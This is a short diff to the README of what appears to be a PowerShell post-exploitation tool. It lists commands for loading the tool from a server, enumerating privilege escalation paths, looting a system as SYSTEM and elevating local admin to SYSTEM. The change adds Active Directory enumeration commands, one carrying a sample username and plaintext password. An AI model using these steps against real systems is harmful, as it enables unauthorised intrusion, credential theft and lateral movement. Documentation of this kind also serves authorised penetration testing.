@@ -30,7 +30,7 @@ Invoke-Wisp -Url http://<your_server>
 ```
 * PRIVILEGE ESCALATION ENUMERATION
 ```
-escalation
+. escalation
 ```
 * LOOTING THE SYSTEM - USE AS nt `authority/system` ONLY!
 ```
@@ -39,6 +39,14 @@ escalation
 * LOCAL ADMIN TO SYSTEM
 ```
 . get_system
+```
+* AD ENUM - AS THE CURRENT USER
+```
+. ad_enumerator -domain domain.com -asme
+```
+* AD ENUM - AS THE DIFF USER
+```
+. ad_enumerator -domain domain.com -user 'DOMAIN\karmaz95' -pass 'enumeration10!'
 ```
 
 # HISTORY
